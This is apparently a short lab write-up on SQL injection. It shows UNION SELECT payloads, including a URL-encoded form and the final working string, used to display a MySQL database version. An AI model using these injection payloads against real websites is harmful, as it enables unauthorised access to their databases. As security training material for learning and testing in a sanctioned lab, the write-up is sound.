# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
## Description
Objective: To solve the lab, display the database version string.

First couple of attempts failed using the classid
```
' UNION SELECT NULL,...--
' UNION SELECT NULL,.../*
```
Until I found that commenting out the preceeding query using `#` did the trick.
```
'+UNION+SELECT+@@version,NULL%23asdasd

# DECODED
' UNION SELECT @@version,NULL#asdasd
```
Above actually didn't mark the lab as solved, despite the version number actually being returned in the response. But by removing the asdasd after the `#` resolved the lab issue.

## Solution
`' UNION SELECT @@version,NULL#`

